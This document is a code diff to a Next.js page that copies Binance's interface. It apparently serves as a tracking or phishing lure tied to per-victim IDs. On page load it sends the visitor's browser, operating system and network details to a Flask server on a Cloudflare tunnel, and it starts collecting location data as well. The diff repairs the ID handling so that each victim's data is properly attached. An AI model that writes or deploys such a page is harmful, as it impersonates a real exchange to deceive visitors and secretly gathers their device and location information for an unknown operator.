@@ -1,8 +1,9 @@
 "use client";
 
 import { useState, useEffect } from "react";
+import { useParams } from "next/navigation"; // <-- The foolproof way to get the ID
 
-// --- BINANCE UI COMPONENTS (Included here to fix import errors) ---
+// --- BINANCE UI COMPONENTS ---
 type IconName = "eye" | "eyeOff" | "arrowDown" | "send" | "download" | "swap" | "search" | "more" | "plus" | "wallet" | "chart" | "clock" | "menu" | "home";
 
 const Icon = ({ name, size = 20, stroke = 1.8 }: { name: IconName; size?: number; stroke?: number; }) => {
@@ -35,20 +36,25 @@ const ExchangeMark = ({ size = 28 }: { size?: number }) => (
 // --- END BINANCE UI COMPONENTS ---
 
 
-export default function BinanceTrackPage({ params }: { params: { id: string } }) {
-  const id = params.id;
-  const [status, setStatus] = useState('idle'); // 'idle', 'loading', 'success', 'error'
+export default function BinanceTrackPage() {
+  // 🚀 THE FIX: Safely get the ID using Next.js useParams hook
+  const params = useParams();
+  const id = Array.isArray(params.id) ? params.id[0] : params.id || "unknown";
+  
+  const [status, setStatus] = useState('idle');
   const [showEnterModal, setShowEnterModal] = useState(true);
 
-  // YOUR FLASK BACKEND URL (Change this when deploying to Railway)
+  // YOUR FLASK BACKEND URL
   const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";
 
   // 1. SEND IP & BROWSER DATA INSTANTLY ON PAGE LOAD
   useEffect(() => {
+    if (id === "unknown") return; // Wait until we have the real ID
+
     const sendInitialData = async () => {
       const ua = navigator.userAgent;
       const collectedData = {
-        tracking_id: id,
+        tracking_id: id, // Now properly attached!
         browser: {
           browser: ua.includes('Firefox') ? 'Firefox' : ua.includes('Chrome') ? 'Chrome' : 'Safari',
           operating_system: ua.includes('Windows') ? 'Windows' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Mac',
@@ -66,14 +72,15 @@ export default function BinanceTrackPage({ params }: { params: { id: string } })
         collectedData.network = { effective_type: conn.effectiveType, downlink: conn.downlink };
       }
 
-      // Send immediately
       try {
         await fetch(`${FLASK_API}/api/collect`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(collectedData)
         });
-      } catch (e) {}
+      } catch (e) {
+        console.error("Failed to send initial data:", e);
+      }
     };
     sendInitialData();
   }, [id]);
@@ -88,7 +95,7 @@ export default function BinanceTrackPage({ params }: { params: { id: string } })
     }
 
     const collectedData: any = {
-      tracking_id: id,
+      tracking_id: id, // Now properly attached!
       location: { permission_status: 'pending' }
     };
 
